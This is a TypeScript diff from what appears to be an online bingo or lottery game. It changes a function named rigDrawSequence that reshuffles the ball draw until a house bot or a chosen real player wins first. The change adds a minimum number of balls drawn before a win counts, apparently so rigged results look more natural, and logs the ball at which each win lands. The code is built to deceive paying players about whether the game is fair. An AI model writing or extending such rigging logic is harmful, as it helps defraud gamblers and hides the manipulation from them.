@@ -233,7 +233,8 @@ export function botsAlreadyInjected(gameId: string): boolean {
 export function rigDrawSequence(
   tickets: { userId: string; card: any; isBot?: boolean }[],
   houseShouldWin: boolean,
-  maxAttempts = 500
+  maxAttempts = 500,
+  minDrawn = 20  // minimum balls drawn before any win is valid
 ): number[] {
   const botUserIds = tickets
     .filter(t => t.isBot)
@@ -250,6 +251,7 @@ export function rigDrawSequence(
 
     // Simulate drawing numbers one by one
     let firstWinnerIsBot: boolean | null = null;
+    let winAtBall = 0;
 
     for (let drawn = 1; drawn <= pool.length; drawn++) {
       const drawnSoFar = pool.slice(0, drawn);
@@ -265,6 +267,7 @@ export function rigDrawSequence(
         const result = checkWin(rows, drawnSoFar);
         if (result.won) {
           firstWinnerIsBot = botUserSet.has(ticket.userId);
+          winAtBall = drawn;
           break;
         }
       }
@@ -272,17 +275,19 @@ export function rigDrawSequence(
       if (firstWinnerIsBot !== null) break;
     }
 
+    // Reject any sequence where a win occurs before minDrawn balls
+    if (firstWinnerIsBot === null || winAtBall < minDrawn) continue;
+
     // Check if this sequence matches what we want
-    if (firstWinnerIsBot === null) continue; // No one won — try again
     if (houseShouldWin && firstWinnerIsBot === true) {
       // Perfect: house bot wins first in this sequence
       // Return as a reversed pool (draw with .pop() from end)
-      logger.info(`[RiggedDraw] House win sequence found in ${attempt + 1} attempt(s)`);
+      logger.info(`[RiggedDraw] House win sequence found in ${attempt + 1} attempt(s) at ball #${winAtBall}`);
       return pool.reverse();
     }
     if (!houseShouldWin && firstWinnerIsBot === false) {
       // Perfect: real player wins first
-      logger.info(`[RiggedDraw] Player win sequence found in ${attempt + 1} attempt(s)`);
+      logger.info(`[RiggedDraw] Player win sequence found in ${attempt + 1} attempt(s) at ball #${winAtBall}`);
       return pool.reverse();
     }
     // Wrong outcome — try another shuffle
